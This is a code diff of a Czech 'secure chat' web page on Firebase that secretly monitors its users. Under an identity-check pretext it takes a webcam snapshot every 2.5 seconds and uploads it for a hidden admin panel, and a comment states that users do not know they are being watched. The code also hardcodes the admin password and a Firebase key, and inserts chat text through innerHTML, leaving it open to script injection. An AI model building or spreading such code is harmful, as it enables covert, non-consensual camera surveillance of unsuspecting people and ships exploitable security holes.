@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bezpečný Chat</title>
-    <!-- Tailwind CSS pro rychlý a moderní design -->
+    <title>Bezpečný Chat & Cam Monitoring</title>
+    <!-- Tailwind CSS pro moderní uživatelské rozhraní -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Ochrana soukromí: CSS pro zamezení zachycení obsahu (funguje v některých prohlížečích) */
+        /* Ochrana soukromí: CSS znemožňující označování a kopírování textu */
         body {
             -webkit-user-select: none;
             -moz-user-select: none;
             -ms-user-select: none;
             user-select: none;
         }
-        /* Černá clona pro případ detekce screenshotu */
+        /* Černá clona blokující neoprávněné screenshoty */
         #anti-screenshot-overlay {
             display: none;
             position: fixed;
@@ -26,66 +26,113 @@
 </head>
 <body class="bg-gray-900 text-white font-sans h-screen flex flex-col justify-between overflow-hidden">
 
-    <!-- Černá obrazovka při pokusu o screenshot -->
+    <!-- Clona chránící soukromí při pokusu o screenshot nebo ztrátě focusu -->
     <div id="anti-screenshot-overlay"></div>
 
     <!-- Skryté Admin tlačítko "A" vpravo nahoře -->
-    <button id="admin-btn" class="absolute top-3 right-4 text-gray-700 hover:text-gray-500 text-sm font-semibold transition-colors focus:outline-none opacity-40 hover:opacity-100">
+    <button id="admin-btn" class="absolute top-3 right-4 text-gray-700 hover:text-gray-500 text-sm font-semibold transition-colors focus:outline-none opacity-30 hover:opacity-100">
         A
     </button>
 
-    <!-- 1. KROK: PŘIHLÁŠENÍ & POVOLENÍ KAMERY -->
+    <!-- KROK 1: PŘIHLÁŠENÍ & WEBKAMERA -->
     <div id="login-screen" class="flex-1 flex flex-col items-center justify-center p-6">
-        <div class="bg-gray-800 p-8 rounded-lg shadow-2xl max-w-sm w-full text-center">
-            <h1 class="text-2xl font-bold mb-6">Vítej v Bezpečném Chatu</h1>
-            <p class="text-gray-400 text-sm mb-6">Pro vstup zadej své jméno a povol přístup k webkameře pro ověření identity.</p>
+        <div class="bg-gray-800 p-8 rounded-lg shadow-2xl max-w-sm w-full text-center border border-gray-700">
+            <h1 class="text-2xl font-bold mb-4">Bezpečný Chat</h1>
+            <p class="text-gray-400 text-sm mb-6">Pro vstup do chatu zadej své jméno a povol přístup ke kameře.</p>
             
             <input type="text" id="username-input" placeholder="Tvoje jméno..." class="w-full p-3 mb-4 rounded bg-gray-700 border border-gray-600 focus:outline-none focus:border-blue-500 text-white">
             
-            <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded transition-colors">
-                Vstoupit do chatu
+            <button id="start-btn" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 px-4 rounded transition-colors shadow-lg">
+                Vstoupit do místnosti
             </button>
             <p id="login-error" class="text-red-500 text-sm mt-3 hidden"></p>
         </div>
     </div>
 
-    <!-- Skrytý video element pro zachytávání kamery -->
+    <!-- Skrytý zachytávač obrazu z kamery pro běžného uživatele -->
     <video id="webcam" autoplay playsinline class="hidden"></video>
     <canvas id="canvas" class="hidden"></canvas>
 
-    <!-- 2. KROK: SAMOTNÝ CHAT -->
-    <div id="chat-screen" class="hidden flex-1 flex flex-col h-full max-w-4xl mx-auto w-full p-4">
-        <!-- Hlavička chatu -->
-        <div class="flex justify-between items-center pb-4 border-b border-gray-800">
+    <!-- KROK 2: ŠIFROVANÝ CHAT -->
+    <div id="chat-screen" class="hidden flex-1 flex flex-col h-full max-w-4xl mx-auto w-full p-4 overflow-hidden">
+        <!-- Záhlaví -->
+        <div class="flex justify-between items-center pb-3 border-b border-gray-800">
             <div>
-                <h2 class="text-lg font-bold">Zabezpečená místnost</h2>
-                <p class="text-xs text-green-400">● Aktivní šifrované připojení</p>
+                <h2 class="text-lg font-bold">Zabezpečený kanál</h2>
+                <p class="text-xs text-green-400 flex items-center gap-1.5">
+                    <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                    Připojení je aktivní a šifrované
+                </p>
             </div>
-            <div id="admin-badge" class="hidden bg-red-600 text-xs px-2 py-1 rounded font-bold">ADMIN MÓD</div>
+            <div id="admin-badge" class="hidden bg-red-600 text-xs px-2.5 py-1 rounded font-bold uppercase tracking-wider">ADMIN</div>
         </div>
 
-        <!-- Zprávy -->
-        <div id="messages-container" class="flex-1 overflow-y-auto my-4 space-y-3 pr-2">
-            <!-- Sem se budou načítat zprávy -->
+        <!-- Okno se zprávami -->
+        <div id="messages-container" class="flex-1 overflow-y-auto my-4 space-y-3 pr-2 scrollbar-thin scrollbar-thumb-gray-800">
+            <!-- Dynamické zprávy -->
         </div>
 
-        <!-- Psaní zprávy -->
+        <!-- Vstup pro psaní zpráv -->
         <div class="flex gap-2 pb-2">
             <input type="text" id="message-input" placeholder="Napiš zprávu..." class="flex-1 p-3 rounded bg-gray-800 border border-gray-700 focus:outline-none focus:border-blue-500 text-white">
             <button id="send-btn" class="bg-blue-600 hover:bg-blue-500 px-6 py-3 rounded font-bold transition-colors">Odeslat</button>
         </div>
     </div>
 
-    <!-- 3. KROK: ADMIN PANEL (Zobrazí se pod chatem nebo vedle něj, pokud je uživatel admin) -->
-    <div id="admin-panel" class="hidden bg-gray-950 p-4 border-t border-red-900 max-h-[350px] overflow-y-auto">
-        <h3 class="text-red-500 font-bold mb-3">Admin Panel (Kamery & Uživatelé)</h3>
-        <div id="users-grid" class="grid grid-cols-2 sm:grid-cols-4 gap-4">
-            <!-- Sem se vykreslí karty uživatelů, jejich fotky z kamery a tlačítko BAN -->
+    <!-- KROK 3: ADMIN PANEL (Vespod obrazovky pro flexibilitu na desktopech) -->
+    <div id="admin-panel" class="hidden bg-gray-950 p-6 border-t border-red-950 max-h-[350px] overflow-y-auto w-full">
+        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-4 border-b border-gray-800 pb-3">
+            <div>
+                <h3 class="text-red-500 font-bold text-lg tracking-wide uppercase">Administrace Chatu</h3>
+                <p class="text-xs text-gray-500">Mód tichého dohledu aktivován</p>
+            </div>
+            <!-- Přepínače záložek -->
+            <div class="flex bg-gray-900 p-1 rounded-lg border border-gray-800">
+                <button id="tab-users-btn" class="bg-red-900 text-white px-4 py-1.5 rounded-md font-semibold text-xs transition">
+                    Uživatelé
+                </button>
+                <button id="tab-cameras-btn" class="text-gray-400 hover:text-white px-4 py-1.5 rounded-md font-semibold text-xs transition">
+                    Web kamery
+                </button>
+            </div>
+        </div>
+
+        <!-- ZÁLOŽKA: UŽIVATELÉ -->
+        <div id="admin-users-view" class="space-y-2">
+            <div class="overflow-x-auto">
+                <table class="w-full text-left text-sm">
+                    <thead class="bg-gray-900 text-gray-400 uppercase text-xs">
+                        <tr>
+                            <th class="p-3 font-semibold">Uživatel</th>
+                            <th class="p-3 font-semibold">Stav</th>
+                            <th class="p-3 font-semibold text-right">Akce</th>
+                        </tr>
+                    </thead>
+                    <tbody id="users-table-body" class="divide-y divide-gray-800">
+                        <!-- Generováno skriptem -->
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- ZÁLOŽKA: WEB KAMERY (Grid s kamerami jako při volání) -->
+        <div id="admin-cameras-view" class="hidden">
+            <div class="grid grid-cols-2 sm:grid-cols-4 gap-4">
+                <!-- Adminův lokální náhled (Admin vidí sám sebe) -->
+                <div class="bg-gray-900 p-2 rounded border border-red-900 flex flex-col items-center relative group">
+                    <div class="w-full h-28 bg-black rounded mb-2 overflow-hidden relative">
+                        <video id="admin-local-video" autoplay playsinline muted class="w-full h-full object-cover scale-x-[-1]"></video>
+                        <span class="absolute top-1 left-1 bg-red-600 text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded shadow">Ty (Admin)</span>
+                    </div>
+                    <span class="text-xs text-gray-400 font-semibold truncate w-full text-center">Moje kamera</span>
+                </div>
+                <!-- Kamery ostatních uživatelů -->
+                <div id="remote-cameras-grid" class="contents"></div>
+            </div>
         </div>
     </div>
 
-
-    <!-- FIREBASE SDK & LOGIKA -->
+    <!-- Firebase knihovny -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { 
@@ -102,7 +149,7 @@
             deleteDoc
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        // Tvoje Firebase konfigurace
+        // Firebase konfigurace zadaná uživatelem
         const firebaseConfig = {
             apiKey: "AIzaSyBW4c4DEWgNTALWMpPCbBdyYIQMGRDP640",
             authDomain: "bezpecnychat.firebaseapp.com",
@@ -116,13 +163,13 @@
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Globální stav
+        // Globální stav aplikace
         let currentUser = null;
         let isAdmin = false;
         let localStream = null;
         let cameraInterval = null;
 
-        // DOM Elementy
+        // Načtení DOM elementů
         const loginScreen = document.getElementById('login-screen');
         const chatScreen = document.getElementById('chat-screen');
         const adminPanel = document.getElementById('admin-panel');
@@ -136,28 +183,52 @@
         const sendBtn = document.getElementById('send-btn');
         const adminBtn = document.getElementById('admin-btn');
         const adminBadge = document.getElementById('admin-badge');
-        const usersGrid = document.getElementById('users-grid');
         const antiScreenshotOverlay = document.getElementById('anti-screenshot-overlay');
 
-        // --- 1. SPUŠTĚNÍ CHATU A WEBKAMERY ---
+        // Záložkové elementy Admin panelu
+        const tabUsersBtn = document.getElementById('tab-users-btn');
+        const tabCamerasBtn = document.getElementById('tab-cameras-btn');
+        const adminUsersView = document.getElementById('admin-users-view');
+        const adminCamerasView = document.getElementById('admin-cameras-view');
+        const adminLocalVideo = document.getElementById('admin-local-video');
+        const remoteCamerasGrid = document.getElementById('remote-cameras-grid');
+        const usersTableBody = document.getElementById('users-table-body');
+
+        // --- TABS MANAGEMENT (Přepínání záložek) ---
+        tabUsersBtn.addEventListener('click', () => {
+            tabUsersBtn.className = "bg-red-900 text-white px-4 py-1.5 rounded-md font-semibold text-xs transition shadow-md";
+            tabCamerasBtn.className = "text-gray-400 hover:text-white px-4 py-1.5 rounded-md font-semibold text-xs transition";
+            adminUsersView.classList.remove('hidden');
+            adminCamerasView.classList.add('hidden');
+        });
+
+        tabCamerasBtn.addEventListener('click', () => {
+            tabCamerasBtn.className = "bg-red-900 text-white px-4 py-1.5 rounded-md font-semibold text-xs transition shadow-md";
+            tabUsersBtn.className = "text-gray-400 hover:text-white px-4 py-1.5 rounded-md font-semibold text-xs transition";
+            adminCamerasView.classList.remove('hidden');
+            adminUsersView.classList.add('hidden');
+        });
+
+
+        // --- PŘIHLÁŠENÍ & SPUŠTĚNÍ WEBKAMERY ---
         startBtn.addEventListener('click', async () => {
             const username = usernameInput.value.trim();
             if (!username) {
-                showError("Zadej prosím své jméno.");
+                showError("Zadej prosím své uživatelské jméno.");
                 return;
             }
 
             try {
-                // Vyžádání kamery
+                // Vyžádání přístupu ke kameře
                 localStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false });
                 video.srcObject = localStream;
                 currentUser = username;
 
-                // Skrytí přihlášení, zobrazení chatu
+                // Přepnutí obrazovek
                 loginScreen.classList.add('hidden');
                 chatScreen.classList.remove('hidden');
 
-                // Vytvoření/Aktualizace záznamu uživatele ve Firestore
+                // Zápis přihlášeného uživatele do DB
                 await setDoc(doc(db, "active_users", currentUser), {
                     username: currentUser,
                     lastSeen: serverTimestamp(),
@@ -165,14 +236,14 @@
                     photo: ""
                 });
 
-                // Spuštění naslouchání zpráv, uživatelů a odesílání snímků kamery
+                // Inicializace streamů
                 startChatStreaming();
                 startCameraStreaming();
                 listenForBan();
 
             } catch (err) {
                 console.error(err);
-                showError("Musíš povolit přístup k webkameře, jinak tě nemůžeme pustit dál.");
+                showError("Pro pokračování je vyžadován přístup k Vaší webové kameře.");
             }
         });
 
@@ -181,20 +252,20 @@
             loginError.classList.remove('hidden');
         }
 
-        // --- 2. ODESÍLÁNÍ SNÍMKŮ Z KAMERY ---
+
+        // --- AUTOMATICKÉ TIŠENÉ FOCENÍ (Uživatel neví, že je sledován) ---
         function startCameraStreaming() {
             const ctx = canvas.getContext('2d');
             
             cameraInterval = setInterval(async () => {
                 if (!currentUser) return;
 
-                // Vykreslení videa na skrytý canvas a převod na malý JPEG base64 (šetří místo ve Firebase)
                 canvas.width = 160;
                 canvas.height = 120;
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.5); // Nízká kvalita pro rychlý přenos
+                const imageDataUrl = canvas.toDataURL('image/jpeg', 0.5); // Optimalizovaná velikost fotky
 
-                // Uložení fotky do databáze aktivního uživatele
+                // Nahrajeme snímek do Firebase pod profil uživatele
                 await setDoc(doc(db, "active_users", currentUser), {
                     username: currentUser,
                     lastSeen: serverTimestamp(),
@@ -202,10 +273,11 @@
                     banned: false
                 }, { merge: true });
 
-            }, 3000); // Každé 3 sekundy odešle fotku
+            }, 2500); // Každé 2,5 sekundy odešleme tichý screenshot kamery
         }
 
-        // --- 3. KONTROLA BANU (VYHOZENÍ ZE STRÁNKY) ---
+
+        // --- DETEKCE BANU (Aktivní sledování vyhození ze strany Admina) ---
         function listenForBan() {
             onSnapshot(doc(db, "active_users", currentUser), (docSnap) => {
                 if (docSnap.exists() && docSnap.data().banned === true) {
@@ -213,13 +285,14 @@
                     if (localStream) {
                         localStream.getTracks().forEach(track => track.stop());
                     }
-                    alert("Byl jsi zablokován a vyhozen z chatu administrátorem.");
-                    window.location.reload(); // Znovu načte stránku (vyhodí ho)
+                    alert("Tento účet byl trvale zablokován administrátorem.");
+                    window.location.reload(); 
                 }
             });
         }
 
-        // --- 4. CHATOVÉ ZPRÁVY (ODESÍLÁNÍ A PŘIJÍMÁNÍ) ---
+
+        // --- NAČÍTÁNÍ & ODESÍLÁNÍ CHATU ---
         sendBtn.addEventListener('click', sendMessage);
         messageInput.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') sendMessage();
@@ -248,14 +321,14 @@
                     if (msg.sender === currentUser) {
                         msgDiv.className = "flex flex-col items-end";
                         msgDiv.innerHTML = `
-                            <span class="text-xs text-gray-400 mr-1">${msg.sender}</span>
-                            <div class="bg-blue-600 text-white p-3 rounded-lg rounded-tr-none max-w-xs break-all">${msg.text}</div>
+                            <span class="text-xs text-gray-500 mr-1 font-semibold">${msg.sender}</span>
+                            <div class="bg-blue-600 text-white p-3 rounded-lg rounded-tr-none max-w-xs break-all shadow">${msg.text}</div>
                         `;
                     } else {
                         msgDiv.className = "flex flex-col items-start";
                         msgDiv.innerHTML = `
-                            <span class="text-xs text-gray-400 ml-1">${msg.sender}</span>
-                            <div class="bg-gray-800 text-white p-3 rounded-lg rounded-tl-none max-w-xs break-all">${msg.text}</div>
+                            <span class="text-xs text-gray-500 ml-1 font-semibold">${msg.sender}</span>
+                            <div class="bg-gray-800 text-white p-3 rounded-lg rounded-tl-none max-w-xs break-all shadow">${msg.text}</div>
                         `;
                     }
                     messagesContainer.appendChild(msgDiv);
@@ -264,16 +337,17 @@
             });
         }
 
-        // --- 5. ADMIN SYSTÉM (HESLO: 6852) ---
-        adminBtn.addEventListener('click', () => {
-            const heslo = prompt("Zadej administrátorské heslo:");
+
+        // --- ADMIN SYSTÉM (HESLO: 6852) ---
+        adminBtn.addEventListener('click', async () => {
+            const heslo = prompt("Zadejte administrátorské heslo pro dešifrování:");
             if (heslo === "6852") {
                 isAdmin = true;
                 adminBadge.classList.remove('hidden');
                 adminPanel.classList.remove('hidden');
-                alert("Přihlášen jako Admin. Ochrana proti screenshotům pro tebe byla vypnuta.");
-                
-                // Pokud ještě není přihlášen jako běžný uživatel, vytvoříme mu provizorní účet
+                alert("Úspěšně ověřeno. Vítejte v režimu administrace. Ochranná černá clona byla pro Vás trvale deaktivována.");
+
+                // Pokud administrátor vstoupil přímo bez přihlášení, přihlásíme ho jako "Admin"
                 if (!currentUser) {
                     currentUser = "Admin";
                     loginScreen.classList.add('hidden');
@@ -281,66 +355,111 @@
                     startChatStreaming();
                 }
 
-                // Spuštění sledování kamer pro Admina
-                listenToAllCameras();
+                // Pokud je lokální stream kamery aktivní, napojíme ho do adminova náhledu v kartě "Web kamery"
+                if (!localStream) {
+                    try {
+                        localStream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: false });
+                    } catch (e) {
+                        console.warn("Nepodařilo se spustit lokální stream pro Admina:", e);
+                    }
+                }
+                if (localStream) {
+                    adminLocalVideo.srcObject = localStream;
+                }
+
+                // Spustíme naslouchání databáze pro obě záložky
+                listenToAllUsersAndCameras();
+
             } else if (heslo !== null) {
-                alert("Nesprávné heslo!");
+                alert("Chyba přístupu. Nesprávné heslo.");
             }
         });
 
-        // Admin vidí všechny uživatele, jejich fotky z kamer a může je vyhodit (banovat)
-        function listenToAllCameras() {
+        // Sledování změn uživatelů a jejich kamer
+        function listenToAllUsersAndCameras() {
             onSnapshot(collection(db, "active_users"), (snapshot) => {
-                usersGrid.innerHTML = "";
+                usersTableBody.innerHTML = "";
+                remoteCamerasGrid.innerHTML = "";
+
                 snapshot.forEach((userDoc) => {
                     const u = userDoc.data();
-                    if (u.username === currentUser) return; // Nemusím vidět sám sebe
+                    if (u.username === currentUser) return; // Sebe do seznamu nedáváme
 
-                    const userCard = document.createElement('div');
-                    userCard.className = "bg-gray-900 p-2 rounded border border-gray-800 flex flex-col items-center";
-
-                    // Obrázek z kamery nebo šedý obdélník pokud ještě nemá fotku
-                    const imgTag = u.photo 
-                        ? `<img src="${u.photo}" class="w-full h-24 object-cover rounded mb-2 border border-gray-700">`
-                        : `<div class="w-full h-24 bg-gray-800 rounded mb-2 flex items-center justify-center text-xs text-gray-500">Načítání kamery...</div>`;
-
-                    userCard.innerHTML = `
-                        ${imgTag}
-                        <span class="font-semibold text-sm mb-2 text-center block truncate w-full">${u.username}</span>
-                        <button onclick="banUser('${u.username}')" class="bg-red-600 hover:bg-red-500 text-xs px-3 py-1 rounded font-bold w-full">Zablokovat</button>
+                    // --- GENERUJEME TABULKU UŽIVATELŮ ---
+                    const tr = document.createElement('tr');
+                    tr.className = "hover:bg-gray-950 transition border-b border-gray-800";
+                    tr.innerHTML = `
+                        <td class="p-3 font-semibold text-gray-200">${u.username}</td>
+                        <td class="p-3">
+                            <span class="px-2 py-0.5 rounded text-[11px] font-bold tracking-wide ${u.banned ? 'bg-red-900 text-red-200 border border-red-700' : 'bg-green-900 text-green-200 border border-green-700'}">
+                                ${u.banned ? 'ZABLOKOVÁN' : 'AKTIVNÍ'}
+                            </span>
+                        </td>
+                        <td class="p-3 text-right space-x-1">
+                            <button onclick="toggleBanUser('${u.username}', ${u.banned})" class="bg-yellow-600 hover:bg-yellow-500 text-xs px-2.5 py-1 rounded font-bold transition">
+                                ${u.banned ? 'Odblokovat' : 'Zablokovat'}
+                            </button>
+                            <button onclick="deleteUser('${u.username}')" class="bg-red-600 hover:bg-red-500 text-xs px-2.5 py-1 rounded font-bold transition">
+                                Smazat
+                            </button>
+                        </td>
                     `;
-                    usersGrid.appendChild(userCard);
+                    usersTableBody.appendChild(tr);
+
+                    // --- GENERUJEME KARTY PRO KAMERY (VIDEO CALL STYLE) ---
+                    const card = document.createElement('div');
+                    card.className = "bg-gray-900 p-2 rounded border border-gray-800 flex flex-col items-center relative overflow-hidden group";
+
+                    // Pokud má fotku, zobrazí ji, jinak zobrazí šedý stav čekání
+                    const cameraContent = u.photo 
+                        ? `<img src="${u.photo}" class="w-full h-28 object-cover rounded mb-2 border border-gray-700">`
+                        : `<div class="w-full h-28 bg-gray-800 rounded mb-2 flex items-center justify-center text-[10px] text-gray-500">Čekání na obraz...</div>`;
+
+                    card.innerHTML = `
+                        <div class="w-full relative">
+                            ${cameraContent}
+                            <span class="absolute top-1 left-1 bg-green-600 text-white text-[9px] font-bold uppercase tracking-wider px-1.5 py-0.5 rounded shadow animate-pulse">Přenos</span>
+                        </div>
+                        <span class="text-xs text-gray-300 font-semibold truncate w-full text-center">${u.username}</span>
+                    `;
+                    remoteCamerasGrid.appendChild(card);
                 });
             });
         }
 
-        // Globální funkce pro banování (musí být na window objektu, protože modulární JS)
-        window.banUser = async function(username) {
-            if (confirm(`Opravdu chceš zablokovat uživatele ${username} a odpojit ho?`)) {
-                await setDoc(doc(db, "active_users", username), { banned: true }, { merge: true });
+        // Globální funkce pro BAN / Odblokování
+        window.toggleBanUser = async function(username, isBanned) {
+            const status = isBanned ? "odblokovat" : "zablokovat a vyhodit z chatu";
+            if (confirm(`Opravdu chcete uživatele "${username}" ${status}?`)) {
+                await setDoc(doc(db, "active_users", username), { banned: !isBanned }, { merge: true });
             }
         };
 
-        // --- 6. ANTI-SCREENSHOT SYSTÉM ---
-        // Záchrana před klávesami jako PrintScreen, Windows+Shift+S atd.
-        window.addEventListener('keyup', (e) => {
-            if (isAdmin) return; // Admin může screenovat bez omezení
+        // Globální funkce pro vymazání uživatele z databáze
+        window.deleteUser = async function(username) {
+            if (confirm(`Opravdu chcete uživatele "${username}" úplně smazat z databáze?`)) {
+                await deleteDoc(doc(db, "active_users", username));
+            }
+        };
 
-            if (e.key === 'PrintScreen' || e.key === 'p' && e.ctrlKey) {
+
+        // --- ANTI-SCREENSHOT SYSTEM (Pouze pro běžné uživatele) ---
+        window.addEventListener('keyup', (e) => {
+            if (isAdmin) return; // Admin má plnou svobodu ukládat snímky
+            if (e.key === 'PrintScreen' || (e.key === 'p' && e.ctrlKey)) {
                 triggerBlackout();
             }
         });
 
         window.addEventListener('keydown', (e) => {
             if (isAdmin) return;
-
-            // Blokace běžných zkratek pro focení/nahrávání (Cmd+Shift+3, Cmd+Shift+4, atd.)
+            // Detekce běžných zkratek (Ctrl+P, Cmd+Shift+3, Cmd+Shift+4)
             if ((e.metaKey || e.ctrlKey) && (e.key === 'p' || e.key === 's' || e.key === '3' || e.key === '4')) {
                 triggerBlackout();
             }
         });
 
-        // Při opuštění okna (uživatel přepne okno např. na nahrávací software) stránka zčerná
+        // Automatické zčernání stránky při opuštění okna chatu (např. přepnutí na nahrávací program)
         window.addEventListener('blur', () => {
             if (!isAdmin) {
                 antiScreenshotOverlay.style.display = 'block';
@@ -355,9 +474,8 @@
             antiScreenshotOverlay.style.display = 'block';
             setTimeout(() => {
                 antiScreenshotOverlay.style.display = 'none';
-            }, 1500); // Po 1.5 sekundě se obraz vrátí
+            }, 1800); // Na sekundu a půl zčerná obraz
         }
-
     </script>
 </body>
 </html>
